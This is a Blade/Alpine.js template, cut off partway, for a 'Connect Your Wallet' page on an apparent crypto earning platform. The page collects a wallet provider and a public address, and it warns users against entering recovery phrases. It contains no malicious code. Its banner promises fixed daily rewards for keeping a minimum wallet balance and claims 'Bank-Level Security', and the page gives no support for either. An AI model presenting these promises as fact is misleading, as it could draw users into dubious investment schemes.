@extends('layouts.dasht')
@section('title', $title)
@section('content')

<div class="min-h-screen bg-gray-50 dark:bg-gray-900" x-data="walletConnectManager()">
    <div class="container mx-auto px-3 sm:px-4 lg:px-6 py-4 sm:py-6 lg:py-8 max-w-7xl">

        <!-- Page Header -->
        <div class="mb-6 sm:mb-8">
            <div class="flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 sm:gap-4">
                <div class="min-w-0 flex-1">
                    <h1 class="text-2xl sm:text-3xl lg:text-4xl font-bold text-gray-900 dark:text-white leading-tight">Connect Your Wallet</h1>
                    <p class="text-sm sm:text-base text-gray-600 dark:text-gray-400 mt-1 sm:mt-2 leading-relaxed">
                        Securely connect your cryptocurrency wallet to start earning rewards
                    </p>
                </div>
                <div class="flex-shrink-0">
                    <a href="{{ route('dashboard') }}"
                       class="inline-flex items-center gap-2 px-3 sm:px-4 py-2 bg-gray-100 hover:bg-gray-200 dark:bg-gray-800 dark:hover:bg-gray-700 text-gray-700 dark:text-gray-300 rounded-xl font-medium transition-all duration-200 text-sm sm:text-base">
                        <i data-lucide="arrow-left" class="w-4 h-4"></i>
                        <span class="hidden sm:inline">Back to Dashboard</span>
                        <span class="sm:hidden">Back</span>
                    </a>
                </div>
            </div>
        </div>

        <!-- Alert Messages -->
        <div class="mb-4 sm:mb-6">
            @if (Session::has('message'))
                <div class="bg-red-50 dark:bg-red-900/20 border-l-4 border-red-400 p-3 sm:p-4 rounded-lg shadow-sm" x-data="{ show: true }" x-show="show">
                    <div class="flex items-start sm:items-center">
                        <div class="flex-shrink-0">
                            <i data-lucide="alert-circle" class="h-4 w-4 sm:h-5 sm:w-5 text-red-400 mt-0.5 sm:mt-0"></i>
                        </div>
                        <div class="ml-2 sm:ml-3 flex-1 min-w-0">
                            <p class="text-xs sm:text-sm text-red-700 dark:text-red-300 leading-relaxed">{{ Session::get('message') }}</p>
                        </div>
                        <div class="ml-2 sm:ml-3 flex-shrink-0">
                            <button @click="show = false" class="inline-flex text-red-400 hover:text-red-600 transition-colors">
                                <i data-lucide="x" class="h-3 w-3 sm:h-4 sm:w-4"></i>
                            </button>
                        </div>
                    </div>
                </div>
            @endif

            @if (Session::has('success'))
                <div class="bg-green-50 dark:bg-green-900/20 border-l-4 border-green-400 p-3 sm:p-4 rounded-lg shadow-sm" x-data="{ show: true }" x-show="show">
                    <div class="flex items-start sm:items-center">
                        <div class="flex-shrink-0">
                            <i data-lucide="check-circle" class="h-4 w-4 sm:h-5 sm:w-5 text-green-400 mt-0.5 sm:mt-0"></i>
                        </div>
                        <div class="ml-2 sm:ml-3 flex-1 min-w-0">
                            <p class="text-xs sm:text-sm text-green-700 dark:text-green-300 leading-relaxed">{{ Session::get('success') }}</p>
                        </div>
                        <div class="ml-2 sm:ml-3 flex-shrink-0">
                            <button @click="show = false" class="inline-flex text-green-400 hover:text-green-600 transition-colors">
                                <i data-lucide="x" class="h-3 w-3 sm:h-4 sm:w-4"></i>
                            </button>
                        </div>
                    </div>
                </div>
            @endif
        </div>

        @if(Auth::user()->wallet_connected == 0)
            <!-- Connect Wallet Section -->
            <div class="max-w-4xl mx-auto">
                <!-- AGROTRADE_EARNINGS_BANNER_V1 -->
                <div class="relative overflow-hidden rounded-xl mb-6 sm:mb-8 border border-blue-800/60 bg-gradient-to-r from-[#13213f] via-[#142448] to-[#0e1a33] shadow-lg">
                    <div class="flex flex-col sm:flex-row items-center gap-3 sm:gap-5 px-4 py-4 sm:px-5 sm:py-4">
                        <img src="{{ asset('public/images/agrotrade-wallet-art.png') }}" alt="Cryptocurrency wallet illustration" class="w-28 h-24 sm:w-32 sm:h-24 object-contain flex-shrink-0 rounded-lg" loading="lazy">
                        <div class="min-w-0 flex-1 text-center sm:text-left">
                            <h3 class="text-base sm:text-lg font-bold text-white mb-1">Start Earning <span class="text-blue-400">{{ $settings->currency }}{{ $settings->min_return }} Daily</span></h3>
                            <p class="text-xs sm:text-sm text-slate-300 leading-relaxed mb-3">Connect your cryptocurrency wallet to unlock daily earning opportunities. Ensure your wallet contains at least <span class="font-semibold text-white">{{ $settings->currency }}{{ $settings->min_balance }}</span> to be eligible for automatic daily rewards.</p>
                            <div class="flex flex-wrap items-center justify-center sm:justify-start gap-x-4 gap-y-2 text-[11px] sm:text-xs text-blue-100">
                                <span class="inline-flex items-center gap-1"><i data-lucide="shield-check" class="w-4 h-4 text-blue-400"></i> Secure Connection</span>
                                <span class="inline-flex items-center gap-1"><i data-lucide="zap" class="w-4 h-4 text-blue-400"></i> Instant Setup</span>
                                <span class="inline-flex items-center gap-1"><i data-lucide="trending-up" class="w-4 h-4 text-blue-400"></i> Daily Rewards</span>
                            </div>
                        </div>
                    </div>
                </div>


                <!-- Wallet Connection Form -->
                <div class="bg-white dark:bg-gray-900 rounded-xl sm:rounded-2xl shadow-xl border border-gray-200 dark:border-gray-700">
                    <div class="p-4 sm:p-6 lg:p-8 border-b border-gray-200 dark:border-gray-700">
                        <div class="flex flex-col sm:flex-row items-start sm:items-center gap-3 sm:gap-4">
                            <div class="p-2 sm:p-3 lg:p-4 bg-gradient-to-br from-purple-100 to-blue-100 dark:from-purple-900/30 dark:to-blue-900/30 rounded-lg sm:rounded-xl flex-shrink-0">
                                <i data-lucide="wallet" class="w-6 h-6 sm:w-7 sm:h-7 lg:w-8 lg:h-8 text-purple-600 dark:text-purple-400"></i>
                            </div>
                            <div class="min-w-0 flex-1">
                                <h2 class="text-xl sm:text-2xl lg:text-3xl font-bold text-gray-900 dark:text-white leading-tight">Connect Your Wallet</h2>
                                <p class="text-gray-600 dark:text-gray-400 mt-1 text-sm sm:text-base leading-relaxed">Choose your wallet provider and enter your public wallet address</p>
                            </div>
                        </div>
                    </div>

                    <div class="p-4 sm:p-6 lg:p-8">
                        <form method="POST" action="{{ route('wallectConnect') }}" class="space-y-6 sm:space-y-8" x-ref="walletForm">
                            @csrf

                            <!-- Wallet Selection -->
                            <div>
                                <label for="wallet" class="block text-sm font-semibold text-gray-700 dark:text-gray-300 mb-3 sm:mb-4">
                                    <i data-lucide="wallet" class="w-4 h-4 inline mr-2"></i>
                                    Select Wallet Provider
                                </label>

                                <!-- Popular Wallets Grid -->
                                <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 gap-3 sm:gap-4 mb-4 sm:mb-6">
                                    <div @click="selectWallet('MetaMask')"
                                         :class="selectedWallet === 'MetaMask' ? 'ring-2 ring-blue-500 bg-blue-50 dark:bg-blue-900/20' : 'bg-gray-50 dark:bg-gray-800 hover:bg-gray-100 dark:hover:bg-gray-700'"
                                         class="p-3 sm:p-4 rounded-lg sm:rounded-xl cursor-pointer transition-all duration-200 border border-gray-200 dark:border-gray-600">
                                        <div class="text-center">
                                            <div class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-2 bg-gradient-to-br from-orange-100 to-red-100 dark:from-orange-900/30 dark:to-red-900/30 rounded-lg flex items-center justify-center">
                                                <svg class="w-5 h-5 sm:w-7 sm:h-7" viewBox="0 0 24 24" fill="none">
                                                    <path d="M22 12c0 5.523-4.477 10-10 10S2 17.523 2 12 6.477 2 12 2s10 4.477 10 10z" fill="#F6851B"/>
                                                    <path d="M12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12 6.477 2 12 2z" stroke="#E2761B" stroke-width="2"/>
                                                    <circle cx="12" cy="12" r="6" fill="#E2761B"/>
                                                    <circle cx="12" cy="12" r="3" fill="#F6851B"/>
                                                </svg>
                                            </div>
                                            <div class="text-xs sm:text-sm font-medium text-gray-900 dark:text-white leading-tight">MetaMask</div>
                                        </div>
                                    </div>

                                    <div @click="selectWallet('Trust Wallet')"
                                         :class="selectedWallet === 'Trust Wallet' ? 'ring-2 ring-blue-500 bg-blue-50 dark:bg-blue-900/20' : 'bg-gray-50 dark:bg-gray-800 hover:bg-gray-100 dark:hover:bg-gray-700'"
                                         class="p-3 sm:p-4 rounded-lg sm:rounded-xl cursor-pointer transition-all duration-200 border border-gray-200 dark:border-gray-600">
                                        <div class="text-center">
                                            <div class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-2 bg-gradient-to-br from-blue-100 to-cyan-100 dark:from-blue-900/30 dark:to-cyan-900/30 rounded-lg flex items-center justify-center">
                                                <svg class="w-5 h-5 sm:w-7 sm:h-7" viewBox="0 0 24 24" fill="none">
                                                    <path d="M12 2l9 9-9 9-9-9 9-9z" fill="#3375BB"/>
                                                    <path d="M12 6l5 5-5 5-5-5 5-5z" fill="#fff"/>
                                                    <path d="M12 8l3 3-3 3-3-3 3-3z" fill="#3375BB"/>
                                                </svg>
                                            </div>
                                            <div class="text-xs sm:text-sm font-medium text-gray-900 dark:text-white leading-tight">Trust Wallet</div>
                                        </div>
                                    </div>

                                    <div @click="selectWallet('Coinbase Wallet')"
                                         :class="selectedWallet === 'Coinbase Wallet' ? 'ring-2 ring-blue-500 bg-blue-50 dark:bg-blue-900/20' : 'bg-gray-50 dark:bg-gray-800 hover:bg-gray-100 dark:hover:bg-gray-700'"
                                         class="p-3 sm:p-4 rounded-lg sm:rounded-xl cursor-pointer transition-all duration-200 border border-gray-200 dark:border-gray-600">
                                        <div class="text-center">
                                            <div class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-2 bg-gradient-to-br from-blue-100 to-indigo-100 dark:from-blue-900/30 dark:to-indigo-900/30 rounded-lg flex items-center justify-center">
                                                <svg class="w-5 h-5 sm:w-7 sm:h-7" viewBox="0 0 24 24" fill="none">
                                                    <circle cx="12" cy="12" r="10" fill="#0052FF"/>
                                                    <path d="M8 12h8M12 8v8" stroke="#fff" stroke-width="2" stroke-linecap="round"/>
                                                </svg>
                                            </div>
                                            <div class="text-xs sm:text-sm font-medium text-gray-900 dark:text-white leading-tight">Coinbase</div>
                                        </div>
                                    </div>

                                    <div @click="showOtherWallets = !showOtherWallets"
                                         class="p-3 sm:p-4 rounded-lg sm:rounded-xl cursor-pointer transition-all duration-200 border-2 border-dashed border-gray-300 dark:border-gray-600 hover:border-blue-400 dark:hover:border-blue-500">
                                        <div class="text-center">
                                            <div class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-2 bg-gradient-to-br from-gray-100 to-gray-200 dark:from-gray-700 dark:to-gray-800 rounded-lg flex items-center justify-center">
                                                <i data-lucide="more-horizontal" class="w-4 h-4 sm:w-6 sm:h-6 text-gray-600 dark:text-gray-400"></i>
                                            </div>
                                            <div class="text-xs sm:text-sm font-medium text-gray-900 dark:text-white leading-tight">Others</div>
                                        </div>
                                    </div>
                                </div>

                                <!-- Other Wallets Dropdown -->
                                <div x-show="showOtherWallets" x-transition:enter="transition ease-out duration-200" x-transition:enter-start="opacity-0 transform -translate-y-2" x-transition:enter-end="opacity-100 transform translate-y-0" class="mb-4 sm:mb-6" style="display: none;">
                                    <!-- AGROTRADE_WALLET_SELECTOR_V2: visual selector, original hidden wallet input remains -->
<div class="aw2-trigger" role="button" tabindex="0" @click="showOtherWallets = !showOtherWallets" @keydown.enter.prevent="showOtherWallets = !showOtherWallets" @keydown.space.prevent="showOtherWallets = !showOtherWallets" :aria-expanded="showOtherWallets.toString()">
  <span x-text="selectedWallet || 'Choose a wallet provider'"></span><span aria-hidden="true" x-text="showOtherWallets ? '&#9650;' : '&#9660;'"></span>
</div>
<div class="aw2-menu" x-show="showOtherWallets" x-cloak>
  <div class="aw2-group">Popular Wallets</div>
  <button type="button" class="aw2-option" :class="selectedWallet === 'MetaMask' ? 'aw2-active' : ''" @click="selectWallet('MetaMask')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/metamask" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">ME</span></span><span class="aw2-name">MetaMask</span><span class="aw2-check" x-show="selectedWallet === 'MetaMask'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Trust Wallet' ? 'aw2-active' : ''" @click="selectWallet('Trust Wallet')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/trustwallet" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">TR</span></span><span class="aw2-name">Trust Wallet</span><span class="aw2-check" x-show="selectedWallet === 'Trust Wallet'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Coinbase Wallet' ? 'aw2-active' : ''" @click="selectWallet('Coinbase Wallet')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/coinbase" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">CO</span></span><span class="aw2-name">Coinbase Wallet</span><span class="aw2-check" x-show="selectedWallet === 'Coinbase Wallet'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Exodus' ? 'aw2-active' : ''" @click="selectWallet('Exodus')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/exodus" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">EX</span></span><span class="aw2-name">Exodus</span><span class="aw2-check" x-show="selectedWallet === 'Exodus'">&#10003;</span></button>
  <div class="aw2-group">Hardware Wallets</div>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Ledger' ? 'aw2-active' : ''" @click="selectWallet('Ledger')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/ledger" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">LE</span></span><span class="aw2-name">Ledger</span><span class="aw2-check" x-show="selectedWallet === 'Ledger'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Trezor' ? 'aw2-active' : ''" @click="selectWallet('Trezor')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/trezor" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">TR</span></span><span class="aw2-name">Trezor</span><span class="aw2-check" x-show="selectedWallet === 'Trezor'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'KeepKey' ? 'aw2-active' : ''" @click="selectWallet('KeepKey')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/keepkey" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">KE</span></span><span class="aw2-name">KeepKey</span><span class="aw2-check" x-show="selectedWallet === 'KeepKey'">&#10003;</span></button>
  <div class="aw2-group">Mobile Wallets</div>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Atomic Wallet' ? 'aw2-active' : ''" @click="selectWallet('Atomic Wallet')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/atomicwallet" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">AT</span></span><span class="aw2-name">Atomic Wallet</span><span class="aw2-check" x-show="selectedWallet === 'Atomic Wallet'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Mycelium' ? 'aw2-active' : ''" @click="selectWallet('Mycelium')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/mycelium" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">MY</span></span><span class="aw2-name">Mycelium</span><span class="aw2-check" x-show="selectedWallet === 'Mycelium'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Jaxx Liberty' ? 'aw2-active' : ''" @click="selectWallet('Jaxx Liberty')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/jaxx" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">JA</span></span><span class="aw2-name">Jaxx Liberty</span><span class="aw2-check" x-show="selectedWallet === 'Jaxx Liberty'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'BRD' ? 'aw2-active' : ''" @click="selectWallet('BRD')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/brd" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">BR</span></span><span class="aw2-name">BRD</span><span class="aw2-check" x-show="selectedWallet === 'BRD'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Guarda' ? 'aw2-active' : ''" @click="selectWallet('Guarda')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/guarda" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">GU</span></span><span class="aw2-name">Guarda</span><span class="aw2-check" x-show="selectedWallet === 'Guarda'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Enjin Wallet' ? 'aw2-active' : ''" @click="selectWallet('Enjin Wallet')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/enjincoin" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">EN</span></span><span class="aw2-name">Enjin Wallet</span><span class="aw2-check" x-show="selectedWallet === 'Enjin Wallet'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'ZenGo' ? 'aw2-active' : ''" @click="selectWallet('ZenGo')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/zengo" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">ZE</span></span><span class="aw2-name">ZenGo</span><span class="aw2-check" x-show="selectedWallet === 'ZenGo'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Ellipal' ? 'aw2-active' : ''" @click="selectWallet('Ellipal')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/ellipal" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">EL</span></span><span class="aw2-name">Ellipal</span><span class="aw2-check" x-show="selectedWallet === 'Ellipal'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Safepal' ? 'aw2-active' : ''" @click="selectWallet('Safepal')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/safepal" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">SA</span></span><span class="aw2-name">Safepal</span><span class="aw2-check" x-show="selectedWallet === 'Safepal'">&#10003;</span></button>
  <div class="aw2-group">Web Wallets</div>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Blockchain Wallet' ? 'aw2-active' : ''" @click="selectWallet('Blockchain Wallet')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/blockchaindotcom" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">BL</span></span><span class="aw2-name">Blockchain Wallet</span><span class="aw2-check" x-show="selectedWallet === 'Blockchain Wallet'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'BitPay' ? 'aw2-active' : ''" @click="selectWallet('BitPay')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/bitpay" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">BI</span></span><span class="aw2-name">BitPay</span><span class="aw2-check" x-show="selectedWallet === 'BitPay'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'BTC.com Wallet' ? 'aw2-active' : ''" @click="selectWallet('BTC.com Wallet')"><span class="aw2-icon"><span class="aw2-fallback">BT</span></span><span class="aw2-name">BTC.com Wallet</span><span class="aw2-check" x-show="selectedWallet === 'BTC.com Wallet'">&#10003;</span></button>
  <div class="aw2-group">Exchange Wallets</div>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Binance Chain Wallet' ? 'aw2-active' : ''" @click="selectWallet('Binance Chain Wallet')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/binance" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">BI</span></span><span class="aw2-name">Binance Chain Wallet</span><span class="aw2-check" x-show="selectedWallet === 'Binance Chain Wallet'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Huobi Wallet' ? 'aw2-active' : ''" @click="selectWallet('Huobi Wallet')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/huobi" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">HU</span></span><span class="aw2-name">Huobi Wallet</span><span class="aw2-check" x-show="selectedWallet === 'Huobi Wallet'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'WazirX' ? 'aw2-active' : ''" @click="selectWallet('WazirX')"><span class="aw2-icon"><span class="aw2-fallback">WA</span></span><span class="aw2-name">WazirX</span><span class="aw2-check" x-show="selectedWallet === 'WazirX'">&#10003;</span></button>
  <div class="aw2-group">Other Wallets</div>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Coinomi' ? 'aw2-active' : ''" @click="selectWallet('Coinomi')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/coinomi" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">CO</span></span><span class="aw2-name">Coinomi</span><span class="aw2-check" x-show="selectedWallet === 'Coinomi'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Edge' ? 'aw2-active' : ''" @click="selectWallet('Edge')"><span class="aw2-icon"><span class="aw2-fallback">ED</span></span><span class="aw2-name">Edge</span><span class="aw2-check" x-show="selectedWallet === 'Edge'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Electrum' ? 'aw2-active' : ''" @click="selectWallet('Electrum')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/electrum" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">EL</span></span><span class="aw2-name">Electrum</span><span class="aw2-check" x-show="selectedWallet === 'Electrum'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Argent' ? 'aw2-active' : ''" @click="selectWallet('Argent')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/argent" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">AR</span></span><span class="aw2-name">Argent</span><span class="aw2-check" x-show="selectedWallet === 'Argent'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'AtomicDEX' ? 'aw2-active' : ''" @click="selectWallet('AtomicDEX')"><span class="aw2-icon"><span class="aw2-fallback">AT</span></span><span class="aw2-name">AtomicDEX</span><span class="aw2-check" x-show="selectedWallet === 'AtomicDEX'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Trustee Wallet' ? 'aw2-active' : ''" @click="selectWallet('Trustee Wallet')"><span class="aw2-icon"><span class="aw2-fallback">TR</span></span><span class="aw2-name">Trustee Wallet</span><span class="aw2-check" x-show="selectedWallet === 'Trustee Wallet'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'MathWallet' ? 'aw2-active' : ''" @click="selectWallet('MathWallet')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/mathwallet" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">MA</span></span><span class="aw2-name">MathWallet</span><span class="aw2-check" x-show="selectedWallet === 'MathWallet'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'TokenPocket' ? 'aw2-active' : ''" @click="selectWallet('TokenPocket')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/tokenpocket" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">TO</span></span><span class="aw2-name">TokenPocket</span><span class="aw2-check" x-show="selectedWallet === 'TokenPocket'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'imToken' ? 'aw2-active' : ''" @click="selectWallet('imToken')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/imtoken" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">IM</span></span><span class="aw2-name">imToken</span><span class="aw2-check" x-show="selectedWallet === 'imToken'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'AlphaWallet' ? 'aw2-active' : ''" @click="selectWallet('AlphaWallet')"><span class="aw2-icon"><span class="aw2-fallback">AL</span></span><span class="aw2-name">AlphaWallet</span><span class="aw2-check" x-show="selectedWallet === 'AlphaWallet'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Rainbow Wallet' ? 'aw2-active' : ''" @click="selectWallet('Rainbow Wallet')"><span class="aw2-icon"><img src="https://cdn.simpleicons.org/rainbow" alt="" loading="lazy" referrerpolicy="no-referrer" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><span class="aw2-fallback" style="display:none">RA</span></span><span class="aw2-name">Rainbow Wallet</span><span class="aw2-check" x-show="selectedWallet === 'Rainbow Wallet'">&#10003;</span></button>
  <button type="button" class="aw2-option" :class="selectedWallet === 'Gnosis Safe' ? 'aw2-active' : ''" @click="selectWallet('Gnosis Safe')"><span class="aw2-icon"><span class="aw2-fallback">GN</span></span><span class="aw2-name">Gnosis Safe</span><span class="aw2-check" x-show="selectedWallet === 'Gnosis Safe'">&#10003;</span></button>
</div>
                                </div>

                                <!-- Hidden input for form submission -->
                                <input type="hidden" name="wallet" :value="selectedWallet">
                            </div>

                                                         <!-- Public address submission; no wallet secrets requested -->
                             <div x-show="selectedWallet" class="space-y-3">
                                 <label for="wallet_address" class="block text-sm font-semibold text-gray-700 dark:text-gray-300">Wallet Address</label>
                                 <p class="text-sm text-amber-700 dark:text-amber-300">Never enter a recovery phrase or private key.</p>
                                 <input type="text" name="wallet_address" id="wallet_address" maxlength="255" placeholder="0x..." required
                                     x-model="walletAddress" class="w-full px-4 py-3 bg-white dark:bg-gray-800 border rounded-xl dark:text-white" />
                             </div>


                            <!-- Connect Button -->
                            <div x-show="selectedWallet" x-transition:enter="transition ease-out duration-300"
                                 x-transition:enter-start="opacity-0 transform translate-y-4"
                                 x-transition:enter-end="opacity-100 transform translate-y-0"
                                 style="display: none;">
                                <button type="submit"
                                        @click="isConnecting = true"
                                        class="w-full inline-flex justify-center items-center gap-2 sm:gap-3 py-3 sm:py-4 px-4 sm:px-6 bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-700 hover:to-purple-700 text-white font-semibold rounded-lg sm:rounded-xl transition-all duration-200 shadow-lg hover:shadow-xl transform hover:scale-[1.02] text-sm sm:text-base"
                                        :class="isConnecting ? 'opacity-75 cursor-wait' : ''">
                                    <div x-show="!isConnecting" class="flex items-center gap-2 sm:gap-3">
                                        <i data-lucide="link" class="h-4 w-4 sm:h-5 sm:w-5"></i>
                                        <span>Connect Wallet</span>
                                    </div>
                                    <div x-show="isConnecting" class="flex items-center gap-2 sm:gap-3">
                                        <div class="animate-spin rounded-full h-4 w-4 sm:h-5 sm:w-5 border-b-2 border-white"></div>
                                        <span>Connecting...</span>
                                    </div>
                                </button>
                            </div>
                        </form>
                    </div>
                </div>

                <!-- Security Features -->
                <div class="grid sm:grid-cols-2 lg:grid-cols-3 gap-4 sm:gap-6 mt-6 sm:mt-8">
                    <div class="text-center p-4 sm:p-6">
                        <div class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-3 sm:mb-4 bg-green-100 dark:bg-green-900/30 rounded-full flex items-center justify-center">
                            <i data-lucide="shield-check" class="w-5 h-5 sm:w-6 sm:h-6 text-green-600"></i>
                        </div>
                        <h3 class="font-semibold text-gray-900 dark:text-white mb-1 sm:mb-2 text-sm sm:text-base">Bank-Level Security</h3>
                        <p class="text-xs sm:text-sm text-gray-600 dark:text-gray-400 leading-relaxed">Your data is encrypted using industry-standard security protocols</p>
                    </div>
                    <div class="text-center p-4 sm:p-6">
                        <div class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-3 sm:mb-4 bg-blue-100 dark:bg-blue-900/30 rounded-full flex items-center justify-center">
                            <i data-lucide="eye-off" class="w-5 h-5 sm:w-6 sm:h-6 text-blue-600"></i>
                        </div>
                        <h3 class="font-semibold text-gray-900 dark:text-white mb-1 sm:mb-2 text-sm sm:text-base">Privacy First</h3>
                        <p class="text-xs sm:text-sm text-gray-600 dark:text-gray-400 leading-relaxed">We never access your funds or store sensitive wallet information</p>
                    </div>
                    <div class="text-center p-4 sm:p-6 sm:col-span-2 lg:col-span-1">
                        <div class="w-10 h-10 sm:w-12 sm:h-12 mx-auto mb-3 sm:mb-4 bg-purple-100 dark:bg-purple-900/30 rounded-full flex items-center justify-center">
